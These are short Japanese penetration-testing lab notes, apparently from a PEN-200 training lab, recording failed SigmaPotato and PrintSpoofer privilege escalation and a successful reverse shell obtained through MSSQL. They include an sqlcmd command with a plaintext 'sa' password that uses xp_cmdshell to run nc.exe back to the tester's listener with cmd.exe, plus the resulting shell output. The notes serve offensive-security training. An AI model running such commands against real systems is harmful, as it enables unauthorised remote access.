- SigmaPotatoおよびPrintSpooferは動作しない
	- Spoolerサービスが停止しているから？

- mssqlユーザーでシェル獲得してみる
```powershell
sqlcmd -U sa -P DeathMarchPac1942 -l 30 -Q "EXECUTE xp_cmdshell 'C:\Users\Public\nc.exe 192.168.45.227 1337 -e cmd.exe';"
```
```sh
┌──(koshi㉿kali)-[~/PEN-200/Skylark/VM18]
└─$ sudo rlwrap nc -lvnp 1337  
[sudo] password for koshi: 
listening on [any] 1337 ...
connect to [192.168.45.227] from (UNKNOWN) [192.168.141.226] 63859
Microsoft Windows [Version 10.0.20348.1249]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt service\mssqlserver

C:\Windows\system32>
```

- C:\SQL2022は閲覧できない

- mssqlもSeImpersonatePrivilegeをもっているがSigmaPotatoとPrintSpooferは失敗する
	- →なぜ？

---

==discord==みた

